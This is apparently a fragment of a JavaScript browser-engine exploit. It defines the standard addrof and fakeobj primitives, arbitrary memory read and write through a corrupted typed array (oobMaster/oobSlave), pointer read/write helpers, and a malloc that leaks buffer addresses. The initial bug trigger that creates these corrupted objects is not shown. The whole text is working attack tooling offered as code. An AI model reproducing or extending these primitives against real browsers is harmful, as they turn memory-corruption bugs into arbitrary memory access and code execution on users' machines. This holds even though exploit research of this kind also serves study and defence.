function i48_put(x, a) {
  a[4] = x | 0;
  a[5] = (x / 4294967296) | 0;
}

function i48_get(a) {
  return a[4] + a[5] * 4294967296;
}

function addrof(x) {
  leakObj.a = x;
  return i48_get(leakArr);
}

function fakeobj(x) {
  i48_put(x, leakArr);
  return leakObj.a;
}

function setupReadMem(pointer, size) {
  i48_put(pointer, oobMaster);
  oobMaster[6] = size;
}

function ReadMemory(pointer, size) {
  setupReadMem(pointer, size);
  const arr = [];
  for (let i = 0; i < size; i++) {
    arr.push(oobSlave[i]);
  }
  return arr;
}

function WriteMemory(address, data) {
  i48_put(address, oobMaster);
  oobMaster[6] = data.length;
  oobSlave.set(data);
}

function read_mem_s(p, sz) {
  setupReadMem(p, sz);
  return oobSlave.toString();
}
function ReadMemoryBytes(p, sz) {
  setupReadMem(p, sz);
  const b = new Uint8Array(sz);
  b.set(oobSlave);
  return b;
}

function readMemoryString(pointer, size) {
  const bytes = ReadMemoryBytes(pointer, size);
  let ans = "";
  for (let i = 0; i < bytes.length; i++) {
    ans += String.fromCharCode(bytes[i]);
  }
  return ans;
}

function ReadPointerAt(address) {
  let ans = 0;
  const d = ReadMemory(address, 8);
  for (let i = 7; i >= 0; i--) {
    ans = 256 * ans + d[i];
  }
  return ans;
}

function WritePointerAt(address, data) {
  const arr = [];
  for (let i = 0; i < 8; i++) {
    arr.push(data & 0xff);
    data = Math.floor(data / 256);
  }
  WriteMemory(address, arr);
}

function hex(x) {
  return Number(x).toString(16);
}

var malloc_nogc = [];

function malloc(sz) {
  var arr = new Uint8Array(sz);
  malloc_nogc.push(arr);
  return ReadPointerAt(addrof(arr) + 0x10);
}
